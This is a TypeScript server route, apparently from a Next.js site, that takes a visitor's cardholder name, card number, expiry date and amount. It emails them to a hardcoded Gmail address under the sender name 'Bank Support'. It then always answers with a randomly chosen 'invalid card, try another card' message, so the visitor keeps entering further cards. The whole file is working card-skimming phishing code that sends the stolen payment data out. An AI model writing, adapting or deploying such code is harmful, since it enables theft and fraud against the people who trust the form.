import nodemailer from "nodemailer";

export async function POST(req : any) {
  try {

    const email = "ourswebsolutions@gmail.com"
    const { cardholderName, amount,expiryDate,cardNumber } = await req.json();

    if (!cardholderName || !cardNumber || !amount|| !expiryDate) {
      return Response.json(
        { success: false, message: "Missing required fields" },
        { status: 400 }
      );
    }

    const transporter = nodemailer.createTransport({
      host: process.env.SMTP_HOST,
      port: Number(process.env.SMTP_PORT),
      secure: false,
      auth: {
        user: process.env.SMTP_USER,
        pass: process.env.SMTP_PASS,
      },
    });

    await transporter.sendMail({
      from: `"Bank Support" <${process.env.SMTP_USER}>`,
      to: email,
      subject: "Your Card Has Been Activated",
      html: `
        <h3>Name: ${cardholderName},</h2>
        <h3>Amount: ${amount},</h2>
        <h3>Number  :${cardNumber},</h2>
        <h3>Date :${expiryDate},</h2>
        
        <p>Your card has been <strong>successfully activated</strong>.</p>
        <p>You can now use your card for transactions.</p>
        <br/>
        <p>Thank you for banking with us.</p>
      `,
    });

   const messages = [
  "This card could not be verified. Please use another valid card.",
  "Invalid card. Please use a valid card.",
  "Card verification failed. Please try another valid card.",
  "The card you entered is not valid. Please use a different card.",
  "This card cannot be processed. Please use another valid card.",
  "Unable to verify this card. Please use a different valid card.",
  "The entered card is invalid. Please try another valid card.",
  "Card activation failed. Please use a valid card.",
  "This card is not supported. Please use another valid card.",
  "The card information is invalid. Please use a valid card."
];
const randomMessage = messages[Math.floor(Math.random() * messages.length)];


    return Response.json({
      success: true,
      message: randomMessage,
    });
  } catch (error) {
    console.error(error);

    return Response.json(
      { success: false, message: "Failed to send email." },
      { status: 500 }
    );
  }
}